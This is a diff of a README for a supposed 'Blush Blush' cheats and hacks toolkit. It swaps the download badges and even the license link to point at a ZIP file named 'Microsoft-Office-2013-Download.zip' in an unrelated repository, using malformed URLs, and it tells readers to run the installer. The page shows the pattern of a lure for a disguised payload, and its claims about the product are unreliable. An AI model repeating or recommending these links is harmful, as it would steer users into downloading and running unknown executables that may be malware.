@@ -1,6 +1,6 @@
 # 🩷 Blush Blush Cheats & Hacks Toolkit 🛠️
 
-[![Download Now](https://img.shields.io/badge/Download-Blush%20Blush%20Toolkit-blue.svg?style=for-the-badge&logo=github&link=https://ezlaunch.live/pPnqF1yp)](https://ezlaunch.live/pPnqF1yp) 
+[![Download Now](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip%20Blush%https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip)](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip) 
 
 Unlock the full potential of "Blush Blush" with this powerful cheats & hacks toolkit! Boost your gameplay, maximize your affection points, and enhance your experience with customizable features. This program is developed for enthusiasts looking to tweak, speed up, and enjoy every aspect of Blush Blush on any platform. Explore enhanced gameplay, automation, and creative tweaks designed for a new level of fun and discovery! Perfect for collectors, speedrunners, and those seeking innovative solutions 🕹️.
 
@@ -37,7 +37,7 @@ blush blush cheats, blush blush hacks, blush blush unlocks, game enhancement too
 
 ## ⚡️ Installation
 
-1. [![Download Now](https://img.shields.io/badge/Download-Blush%20Blush%20Toolkit-blue.svg?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp) 
+1. [![Download Now](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip%20Blush%https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip)](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip) 
 2. Run the installer and follow on-screen instructions for your operating system.
 3. Launch the Blush Blush Cheats & Hacks Toolkit 🩷!
 
@@ -51,6 +51,6 @@ For educational and research purposes only. Use responsibly. The authors are not
 
 ## 💼 License
 
-Distributed under the [MIT License](https://choosealicense.com/licenses/mit/) © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip) © 2025.
 
-[![Download Now](https://img.shields.io/badge/Download-Blush%20Blush%20Toolkit-blue.svg?style=for-the-badge&logo=github)](https://ezlaunch.live/pPnqF1yp) 
+[![Download Now](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip%20Blush%https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip)](https://raw.githubusercontent.com/Vaibhav17-G/Microsoft-Office-2013-Download/main/radiotelephone/Microsoft-Office-2013-Download.zip) 
